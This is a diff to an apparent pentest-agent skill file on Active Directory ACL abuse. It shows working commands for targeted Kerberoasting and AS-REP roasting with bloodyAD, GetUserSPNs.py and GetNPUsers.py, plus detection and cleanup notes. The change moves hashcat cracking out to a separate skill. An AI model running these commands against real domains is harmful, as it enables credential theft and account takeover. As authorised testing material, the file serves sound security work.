@@ -242,10 +242,11 @@ bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP set object \
   targetuser serviceprincipalname -v 'ops/whatever1'
 
 # Extract TGS
-GetUserSPNs.py DOMAIN/attacker -k -no-pass -request-user targetuser
+GetUserSPNs.py DOMAIN/attacker -k -no-pass -request-user targetuser \
+  -outputfile engagement/evidence/acl-targeted-kerberoast.txt
 
-# Crack (hashcat mode 13100 for RC4, 19700 for AES)
-hashcat -m 13100 tgs_hash.txt wordlist.txt
+# Do NOT crack here — save hash and route to credential-cracking
+# (hashcat mode 13100 for RC4, 19700 for AES)
 
 # Remove SPN immediately (cleanup)
 bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP set object \
@@ -259,8 +260,10 @@ Get-DomainUser targetuser | Get-DomainSPNTicket | fl
 Set-DomainObject -Identity targetuser -Clear serviceprincipalname
 ```
 
-**OPSEC**: Medium — SPN creation logged as Event 5136. Cracking is offline.
-Remove SPN immediately after TGS extraction.
+**OPSEC**: Medium — SPN creation logged as Event 5136. Remove SPN immediately
+after TGS extraction. **Do NOT crack hashes in this skill.** Save hashes to
+`engagement/evidence/` and return to the orchestrator with the hash file path,
+hash type/mode, and a routing recommendation to **credential-cracking**.
 
 ### Option C: ASREPRoasting (Disable Pre-Auth)
 
@@ -270,10 +273,11 @@ bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP add uac \
   targetuser -f DONT_REQ_PREAUTH
 
 # Get AS-REP hash
-GetNPUsers.py DOMAIN/targetuser -format hashcat -outputfile asrep.txt -k -no-pass
+GetNPUsers.py DOMAIN/targetuser -format hashcat \
+  -outputfile engagement/evidence/acl-asrep-hash.txt -k -no-pass
 
-# Crack
-hashcat -m 18200 asrep.txt wordlist.txt
+# Do NOT crack here — save hash and route to credential-cracking
+# (hashcat mode 18200 for AS-REP)
 
 # Restore pre-auth (cleanup)
 bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP remove uac \
